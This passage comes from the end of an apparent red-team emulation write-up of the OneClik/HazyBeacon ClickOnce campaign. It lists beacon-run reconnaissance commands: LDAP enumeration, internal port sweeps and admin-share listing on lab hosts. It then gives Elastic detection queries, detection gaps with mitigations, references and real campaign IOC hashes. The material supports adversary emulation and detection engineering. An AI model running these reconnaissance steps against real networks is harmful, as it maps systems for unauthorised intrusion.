ldapsearch (objectClass=computer) -a sAMAccountName,operatingSystem,dNSHostName,msDS-AllowedToActOnBehalfOfOtherIdentity

# Enumerate groups
ldapsearch (objectClass=group) -a sAMAccountName,member
```

### Network Scanning

```
# SAR-BOF smartscan for internal network discovery
smartscan 10.1.10.0/24 -p standart
```

Or targeted port scan:

```
smartscan 10.1.10.0/24 -p 445,3389,5985,1433
```

### Share Enumeration

```
fs ls \\10.1.10.22\C$
fs ls \\10.1.10.11\NETLOGON
fs ls \\10.1.10.10\SYSVOL
```

---

## 10 - Detection Matrix (Elastic Queries)

### Complete Detection Reference

| Phase | ATT&CK ID | Detection Method | Elastic Query | Expected Result |
|-------|-----------|------------------|---------------|-------------------------------|
| Initial Access | T1204.002 | ClickOnce execution chain | `event.code:"1" AND process.parent.name:"dfsvc.exe" AND process.command_line:*LocalApps*` | Fires on ClickOnce app launch |
| Initial Access | T1055 | VirtualAlloc from ClickOnce app | `event.code:"10" AND process.executable:*Apps\\2.0* AND winlog.event_data.CallTrace:*VirtualAlloc*` | Requires Sysmon process access logging |
| Initial Access | T1071.001 | Outbound HTTPS from ClickOnce dir | `event.code:"3" AND process.executable:*Apps\\2.0* AND destination.port:443` | Fires on first beacon |
| Defense Evasion | T1562.006 | ETW patching | `event.module:"endpoint" AND event.action:"Memory Threat Detection Alert"` | May fire on AMSI/ETW patching |
| Defense Evasion | T1562.006 | Memory threat from ClickOnce process | `event.action:"Memory Threat Detection Alert" AND process.name:"UpdateHelper.exe"` | Depends on Elastic Defend config |
| C2 | T1102.002 | CloudFront C2 traffic | `destination.domain:*cloudfront.net AND source.ip:10.1.10.*` | Shows traffic but no alert (legitimate domain) |
| Discovery | T1046 | Internal port scan | `rule.name:"Potential Network Scan Executed From Host"` | Fires on smartscan |
| Discovery | T1087.002 | LDAP enumeration | `event.code:"1644" AND winlog.event_data.SearchFilter:*objectClass*` | Only with DC-side auditing enabled |

### Detection Gaps (What OneClik / HazyBeacon Evades)

| Gap | Why It Works | Mitigation |
|-----|-------------|------------|
| ClickOnce delivery | Legitimate Windows deployment mechanism, signed by Microsoft | Monitor for ClickOnce apps making outbound HTTPS to non-corporate domains |
| CloudFront C2 channel | Traffic to `*.cloudfront.net` is legitimate and typically allowlisted | SSL inspection + behavioral analysis of CloudFront traffic patterns |
| Lambda Function URL C2 | `*.lambda-url.<region>.on.aws` is a legitimate AWS domain | DNS monitoring for unusual Lambda URL patterns from non-cloud-native environments |
| In-memory shellcode execution | No files dropped to disk, shellcode runs in-process | Memory scanning, VirtualAlloc + VirtualProtect call chain monitoring |
| Sleep-masked beacon in memory | Encrypted during sleep, no persistent memory artifact | Periodic memory scanning during beacon wake periods |
| Inline BOF execution | Zero child process creation for most commands | Enable DC-side LDAP query auditing (Event ID 1644) |

---

## References

1. **Trellix Advanced Research Center** - "OneClik: A ClickOnce-Based Red Team Campaign Simulating APT Tactics in Energy Infrastructure" - Primary reference for the infection chain emulated in this writeup. RunnerBeacon Go backdoor with CloudFront/Lambda C2. [Link](https://www.trellix.com/blogs/research/oneclik-a-clickonce-based-red-team-campaign-simulating-apt-tactics-in-energy-infrastructure/)

2. **Unit 42 (Palo Alto Networks)** - "Windows Backdoor for Novel C2 Communication" - HazyBeacon threat intelligence, Lambda C2 mechanics, IOCs. [Link](https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/)

3. **Abhay Haswani (Medium)** - "Deep Dive: How State-Backed HazyBeacon Malware is Weaponizing AWS Lambda & Steganography" - Supplementary analysis with steganography details. [Link](https://medium.com/@abhay03124/deep-dive-how-state-backed-hazybeacon-malware-is-weaponizing-aws-lambda-steganography-0690cfad541d)

4. **MITRE ATT&CK** - Technique references: T1566.002, T1204.002, T1055, T1106, T1027, T1140, T1622, T1562.006, T1071.001, T1102.002, T1059, T1105

5. **Phantom C2 Documentation** - Architecture, CloudFront CDN Setup, Operator Guide, Profiles

6. **GOAD (Orange Cyberdefense)** - Game of Active Directory lab framework

7. **adaptix-serverless-c2** - Open-source serverless C2 plugin for Adaptix. [Link](https://github.com/stillbigjosh/adaptix-serverless-c2)

### Key IOCs 

These IOCs are from the real campaign. 

| Artifact | SHA256 | Role |
|----------|--------|------|
| mscorsvc.dll (HazyBeacon) | `4931df8650521cfd686782919bda0f376475f9fc5f1fee9d7cf3a4e0d9c73e30` | Primary backdoor |
| igfx.exe | `279e60e77207444c7ec7421e811048267971b0db42f4b4d3e975c7d0af7f511e` | File collector |
| google.exe | `d20b536c88ecd326f79d7a9180f41a2e47a40fcf2cc6a2b02d68a081c89eaeaa` | Google Drive uploader |
| GoogleDrive.exe | `304c615f4a8c2c2b36478b693db767d41be998032252c8159cc22c18a65ab498` | Google Drive uploader variant |
| Dropbox.exe | `3255798db8936b5b3ae9fed6292413ce20da48131b27394c844ecec186a1e92f` | Dropbox uploader |
| GoogleGet.exe | `d961aca6c2899cc1495c0e64a29b85aa226f40cf9d42dadc291c4f601d6e27c3` | Google Drive auth handler |

**Infrastructure pattern:** `*.lambda-url.ap-southeast-1.on.aws` (Lambda C2), CloudFront distributions for CDN relay

